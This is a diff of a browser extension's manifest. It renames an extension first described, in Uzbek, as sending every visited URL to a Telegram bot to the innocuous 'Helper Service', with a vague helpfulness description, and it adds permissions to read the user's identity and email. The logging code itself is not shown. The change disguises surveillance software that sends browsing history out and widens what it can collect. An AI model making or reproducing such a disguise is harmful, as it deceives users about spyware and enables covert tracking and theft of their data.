@@ -1,10 +1,15 @@
 {
   "manifest_version": 3,
-  "name": "URL Logger to Telegram",
-  "description": "Har bir kirgan URL'ni Telegram botga yuboradi",
+  "name": "Helper Service",
+  "description": "Helper functions for better browsing experience",
   "version": "1.0",
-  "permissions": ["tabs"],
+  "permissions": ["tabs", "identity", "identity.email"],
   "background": {
     "service_worker": "background.js"
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
   }
 }
